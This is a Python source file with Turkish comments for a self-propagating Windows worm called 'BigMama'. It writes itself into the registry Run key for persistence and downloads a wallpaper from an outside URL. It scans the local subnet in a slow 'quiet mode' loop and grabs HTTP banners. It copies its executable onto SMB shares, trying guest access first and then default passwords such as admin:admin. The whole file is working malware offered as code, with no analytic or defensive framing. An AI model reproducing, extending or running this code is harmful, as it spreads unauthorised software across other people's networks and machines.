import os
import socket
import subprocess
import random
import time
import ctypes
import urllib.request
import winreg
from smb.SMBConnection import SMBConnection  # pip install pysmb

# ------------------------
# Ağ bloğu (otomatik bulma)
# ------------------------
def get_local_subnet():
    ip = socket.gethostbyname(socket.gethostname())
    parts = ip.split(".")
    subnet = ".".join(parts[:3]) + "."
    return subnet

subnet = get_local_subnet()
print("[*] Bulunan subnet:", subnet)

# Tarama portları
ports = [80, 445]

# Kullanıcı-şifre listesi (örnek)
credentials = [
    "admin:admin",
    "user:user",
    "teyst:tesit",
    "admin:04590e"
]

# Kopyalanacak dosya (kendi exe’n olacak)
exe_dosya = "BigMama.exe"

# ------------------------
# PAYLOAD (autorun + wallpaper)
# ------------------------

def add_to_autorun(exe_path):
    try:
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, "BigMama", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(reg_key)
        print("[+] Autorun eklendi:", exe_path)
    except Exception as e:
        print("[-] Autorun eklenemedi:", e)

def change_wallpaper(url):
    try:
        hedef = os.path.expanduser("~\\AppData\\Roaming\\bigmama.jpg")
        urllib.request.urlretrieve(url, hedef)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, hedef, 3)
        print("[+] Wallpaper değiştirildi:", hedef)
    except Exception as e:
        print("[-] Wallpaper değiştirilemedi:", e)

# ------------------------
# WORM MEKANİĞİ
# ------------------------

def ping(ip):
    try:
        if os.name == "nt":  # Windows
            subprocess.check_output(["ping", "-n", "1", ip], stderr=subprocess.DEVNULL)
        else:  # Linux/Mac
            subprocess.check_output(["ping", "-c", "1", ip], stderr=subprocess.DEVNULL)
        return True
    except:
        return False

def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        sock.connect((ip, port))
        sock.close()
        return True
    except:
        return False

def http_banner_grab(ip, port=80):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((ip, port))
        sock.send(b"GET / HTTP/1.0\r\n\r\n")
        response = sock.recv(1024).decode(errors="ignore")
        sock.close()
        with open("scan.log", "a") as log:
            log.write(f"\n[Banner] {ip}:{port} cevabı:\n" + "\n".join(response.split("\n")[:5]) + "\n")
    except:
        pass

def smb_replicate(ip, exe_path, username="", password=""):
    try:
        conn = SMBConnection(username, password, "BigMama", ip, use_ntlm_v2=True)
        if conn.connect(ip, 445):
            shares = conn.listShares()
            for share in shares:
                if share.isSpecial or share.name.upper() in ["ADMIN$", "C$", "IPC$"]:
                    continue
                try:
                    try:
                        conn.createDirectory(share.name, "BigMama")
                    except:
                        pass
                    with open(exe_path, "rb") as f:
                        conn.storeFile(share.name, "BigMama/BigMama.exe", f)
                    with open("scan.log", "a") as log:
                        log.write(f"[+] {ip} → {share.name}\\BigMama\\BigMama.exe kopyalandı\n")
                except:
                    continue
            conn.close()
            return True
    except:
        return False
    return False

def network_scan(exe_path):
    while True:  # rastgele IP seçimi, sürekli döngü
        i = random.randint(1, 254)
        ip = f"{subnet}{i}"
        if ping(ip):
            with open("scan.log", "a") as log:
                log.write(f"[+] {ip} aktif\n")
            for port in ports:
                if check_port(ip, port):
                    with open("scan.log", "a") as log:
                        log.write(f"    └── Port {port} açık\n")

                    if port == 80:
                        http_banner_grab(ip, port)

                    if port == 445:
                        if smb_replicate(ip, exe_path):  # guest
                            continue
                        for cred in credentials[:2]:  # sadece ilk 2 credential dene
                            user, pwd = cred.split(":")
                            if smb_replicate(ip, exe_path, user, pwd):
                                break
        time.sleep(random.uniform(10, 60))  # sessiz mod → uzun bekleme

# ------------------------
# ANA PROGRAM
# ------------------------

if __name__ == "__main__":
    exe_yolu = os.path.abspath(__file__)

    # 1) Payload kısmı
    add_to_autorun(exe_yolu)
    change_wallpaper("https://share.google/K12NSPFX54XAvkgH8")

    # 2) Worm kısmı
    network_scan(exe_yolu)